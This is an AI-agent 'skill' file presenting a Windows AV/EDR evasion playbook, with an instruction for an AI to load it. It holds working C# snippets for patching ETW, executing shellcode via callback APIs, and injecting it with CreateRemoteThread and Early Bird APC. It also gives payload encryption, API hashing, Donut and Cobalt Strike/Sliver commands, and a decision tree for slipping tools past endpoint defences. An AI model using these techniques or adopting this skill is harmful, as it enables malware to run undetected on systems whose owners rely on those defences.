---
name: windows-av-evasion
description: >-
  AV/EDR evasion playbook for Windows. Use when bypassing AMSI, ETW, .NET assembly detection, shellcode execution, process injection, API hooking, and signature-based detection on Windows endpoints.
---

# SKILL: AV/EDR Evasion — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert AV/EDR evasion techniques for Windows. Covers AMSI bypass, ETW bypass, .NET assembly loading, shellcode execution, process injection, unhooking, payload encryption, and signature evasion. Base models miss detection-specific bypass chains and syscall-level evasion nuances.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) when privesc tools are blocked by AV
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) when lateral movement tools trigger EDR
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) when Rubeus/Mimikatz are detected
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for non-binary AD attacks (less AV-sensitive)

### Advanced Reference

Also load [AMSI_BYPASS_TECHNIQUES.md](./AMSI_BYPASS_TECHNIQUES.md) when you need:
- Detailed AMSI bypass code patterns (memory patching, reflection)
- PowerShell-specific AMSI bypasses
- .NET AMSI bypass techniques

---

## 1. AMSI BYPASS OVERVIEW

AMSI (Antimalware Scan Interface) inspects PowerShell, .NET, VBScript, JScript, and Office macros at runtime.

### Key AMSI Bypass Categories

| Category | Method | Detection Risk | Persistence |
|---|---|---|---|
| Memory patching | Patch `AmsiScanBuffer` in `amsi.dll` | Medium | Per-process |
| Reflection | Modify AMSI init flags via .NET reflection | Medium | Per-session |
| String obfuscation | Encode/split AMSI trigger strings | Low | Per-payload |
| PowerShell downgrade | Force PS v2 (no AMSI) | Low | Per-session |
| CLM bypass | Escape Constrained Language Mode | Medium | Per-session |
| COM hijack | Redirect AMSI COM server | Low | Per-user |

### Quick AMSI Bypass (One-Liners)

```powershell
# PowerShell v2 downgrade (if .NET 2.0 available — no AMSI in v2)
powershell -Version 2

# Reflection-based (set amsiInitFailed = true)
# Obfuscated to avoid static detection — see AMSI_BYPASS_TECHNIQUES.md for full patterns
```

---

## 2. ETW BYPASS

ETW (Event Tracing for Windows) feeds telemetry to EDR. Patching `EtwEventWrite` stops .NET assembly load events.

### Patch EtwEventWrite

```csharp
// C# — patch EtwEventWrite to return immediately
var ntdll = GetModuleHandle("ntdll.dll");
var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
// Write: ret (0xC3) to first byte
VirtualProtect(etwAddr, 1, 0x40, out uint oldProtect);
Marshal.WriteByte(etwAddr, 0xC3);
VirtualProtect(etwAddr, 1, oldProtect, out _);
```

### PowerShell ETW Bypass

```powershell
# Disable Script Block Logging (ETW provider)
[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
# Set internal field to disable ETW tracing
```

---

## 3. .NET ASSEMBLY LOADING

### In-Memory Assembly.Load

```csharp
byte[] assemblyBytes = File.ReadAllBytes("tool.exe");
// Or download from URL, decrypt from resource
Assembly assembly = Assembly.Load(assemblyBytes);
assembly.EntryPoint.Invoke(null, new object[] { args });
```

### Donut — Convert .NET Assembly to Shellcode

```bash
# Generate shellcode from .NET EXE
donut -f tool.exe -o payload.bin -a 2 -c ToolNamespace.Program -m Main

# With parameters
donut -f Rubeus.exe -o rubeus.bin -a 2 -p "kerberoast /outfile:tgs.txt"

# Then load shellcode via any injection technique (§5)
```

### execute-assembly (C2 Framework)

```
# Cobalt Strike
execute-assembly /path/to/Rubeus.exe kerberoast

# Sliver
execute-assembly /path/to/SharpHound.exe -c all

# Havoc
dotnet inline-execute /path/to/tool.exe args
```

---

## 4. SHELLCODE EXECUTION TECHNIQUES

### VirtualAlloc + Callback (Avoids CreateThread)

```csharp
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
Marshal.Copy(sc, 0, addr, sc.Length);
// Use callback API instead of CreateThread (less monitored)
EnumWindows(addr, IntPtr.Zero);
```

**Callback APIs for shellcode execution**: `EnumWindows`, `EnumChildWindows`, `EnumFonts`, `EnumDesktops`, `CertEnumSystemStore`, `EnumDateFormats` — all accept function pointers that can point to shellcode.

---

## 5. PROCESS INJECTION TECHNIQUES

| Technique | APIs Used | Detection Risk | Notes |
|---|---|---|---|
| **CreateRemoteThread** | OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread | High | Classic, heavily monitored |
| **NtMapViewOfSection** | NtCreateSection, NtMapViewOfSection | Medium | Shared memory, less common |
| **Process Hollowing** | CreateProcess (SUSPENDED), NtUnmapViewOfSection, WriteProcessMemory, ResumeThread | Medium | Replace process image |
| **Thread Hijacking** | SuspendThread, SetThreadContext, ResumeThread | Medium | Modify existing thread |
| **Early Bird** | CreateProcess (SUSPENDED), QueueUserAPC, ResumeThread | Low-Medium | APC before main thread |
| **Phantom DLL Hollowing** | Map DLL section, overwrite with shellcode | Low | Uses legitimate DLL mapping |
| **Module Stomping** | LoadLibrary, overwrite .text section | Low | Backed by legitimate DLL |
| **Transacted Hollowing** | NtCreateTransaction, NtCreateSection | Low | No suspicious allocations |

### CreateRemoteThread (Basic Pattern)

```csharp
IntPtr hProcess = OpenProcess(0x001F0FFF, false, targetPid);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(hProcess, addr, sc, (uint)sc.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

### Early Bird APC Injection

```csharp
// Create suspended process
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ..., ref si, ref pi);

// Allocate and write shellcode
IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(pi.hProcess, addr, sc, (uint)sc.Length, out _);

// Queue APC to main thread (runs before main entry point)
QueueUserAPC(addr, pi.hThread, IntPtr.Zero);
ResumeThread(pi.hThread);
```

---

## 6. UNHOOKING — BYPASS EDR API HOOKS

### Direct Syscalls (SysWhispers / HellsGate)

EDR hooks `ntdll.dll` functions. Direct syscalls bypass hooks by invoking the kernel directly.

```
Normal: User code → ntdll.dll (HOOKED) → kernel
Direct: User code → syscall instruction → kernel (bypasses hook)
```

| Tool | Method | Notes |
|---|---|---|
| **SysWhispers2/3** | Compile-time syscall stubs | Static syscall numbers |
| **HellsGate** | Runtime syscall number resolution | Dynamic, harder to detect |
| **HalosGate** | Resolve from neighboring unhooked syscalls | Handles partial hooks |
| **TartarusGate** | Extended HalosGate | More robust resolution |

### Fresh ntdll Copy

```csharp
// Read clean ntdll.dll from disk
byte[] cleanNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
// Or from KnownDlls: \KnownDlls\ntdll.dll
// Or from suspended process (create sacrificial process, read its ntdll)

// Overwrite hooked .text section with clean copy
// → All EDR hooks in ntdll are removed
```

### Indirect Syscalls

```
// Instead of: syscall (in your code — suspicious)
// Do: jump to syscall instruction inside ntdll.dll (legitimate location)
// The ret address on stack points to ntdll.dll, not your code
```

---

## 7. PAYLOAD ENCRYPTION & OBFUSCATION

### Encryption Methods

```csharp
// AES encryption (preferred)
using Aes aes = Aes.Create();
aes.Key = key; aes.IV = iv;
byte[] encrypted = aes.CreateEncryptor().TransformFinalBlock(shellcode, 0, shellcode.Length);

// XOR (simple, fast)
for (int i = 0; i < shellcode.Length; i++)
    shellcode[i] ^= key[i % key.Length];

// RC4 (stream cipher, simple implementation)
```

### Sleep Obfuscation

Encrypt shellcode in memory during sleep to avoid memory scanners.

| Technique | Method |
|---|---|
| **Ekko** | ROP chain → encrypt heap/stack during sleep |
| **Foliage** | APC-based sleep with memory encryption |
| **DeathSleep** | Thread de-registration during sleep |

### Staged Loading

```
Stage 1: Small, encrypted loader (evades static analysis)
Stage 2: Download actual payload at runtime (encrypted)
Stage 3: Decrypt in memory → execute
```

---

## 8. SIGNATURE EVASION

### String Encryption

```csharp
// Avoid plaintext API names, URLs, tool names
// Use encrypted strings, decrypt at runtime
string decrypted = Decrypt(encryptedApiName);
IntPtr funcPtr = GetProcAddress(GetModuleHandle("kernel32.dll"), decrypted);
```

### API Hashing

```csharp
// Resolve API by hash instead of name (avoids string detection)
// Hash "VirtualAlloc" → 0x91AFCA54
IntPtr func = GetProcAddressByHash(module, 0x91AFCA54);
```

### Metadata Removal

```bash
# Strip .NET metadata
ConfuserEx / .NET Reactor / Obfuscar

# Remove PE metadata (timestamps, rich header, debug info)
# Modify compilation timestamps
# Strip PDB paths
```

### C2 Framework Evasion

| Framework | Key Evasion Features |
|---|---|
| **Cobalt Strike** | Malleable C2 profiles, HTTP/S traffic shaping, sleep jitter, PE evasion |
| **Sliver** | Multiple protocols (mTLS, WireGuard, DNS), stager-less, built-in obfuscation |
| **Havoc** | Indirect syscalls, sleep obfuscation, module stomping |
| **Brute Ratel** | Badger agent, syscall evasion, ETW/AMSI bypass built-in |

---

## 9. AV/EDR EVASION DECISION TREE

```
Need to execute tool/payload on protected host
│
├── PowerShell-based payload?
│   ├── AMSI blocking? → AMSI bypass first (§1)
│   │   ├── .NET 2.0 available? → PS v2 downgrade (no AMSI)
│   │   ├── Memory patch AmsiScanBuffer
│   │   └── Reflection-based bypass
│   ├── Script Block Logging? → ETW bypass (§2)
│   └── Constrained Language Mode? → CLM bypass or switch to C#
│
├── .NET assembly (Rubeus, SharpHound, etc.)?
│   ├── Direct execution blocked?
│   │   ├── In-memory Assembly.Load (§3)
│   │   ├── Convert to shellcode with Donut (§3)
│   │   └── Use C2 execute-assembly (§3)
│   └── Still detected?
│       ├── Obfuscate assembly (ConfuserEx)
│       ├── Modify source + recompile
│       └── Use BOFs (Beacon Object Files) if CS
│
├── Shellcode execution needed?
│   ├── Basic → VirtualAlloc + callback (§4)
│   ├── Need injection → choose technique by OPSEC (§5)
│   │   ├── Low detection needed → module stomping or phantom DLL
│   │   ├── Medium → early bird APC or NtMapViewOfSection
│   │   └── Quick and dirty → CreateRemoteThread
│   └── Memory scanners detect payload?
│       ├── Encrypt payload → decrypt only at execution (§7)
│       └── Sleep obfuscation (Ekko/Foliage) (§7)
│
├── EDR hooking ntdll.dll?
│   ├── Direct syscalls (SysWhispers3/HellsGate) (§6)
│   ├── Fresh ntdll copy from disk/KnownDlls (§6)
│   └── Indirect syscalls (return to ntdll instruction) (§6)
│
├── Signature detection?
│   ├── Known tool signature → modify + recompile
│   ├── String-based → string encryption / API hashing (§8)
│   ├── PE metadata → strip/modify (§8)
│   └── Behavioral → change execution flow, add junk code
│
└── All local evasion fails?
    ├── Use Living-off-the-Land (LOLBins): certutil, mshta, regsvr32
    ├── Use legitimate admin tools (PsExec, WMI, WinRM)
    └── Switch to fileless / memory-only techniques
```
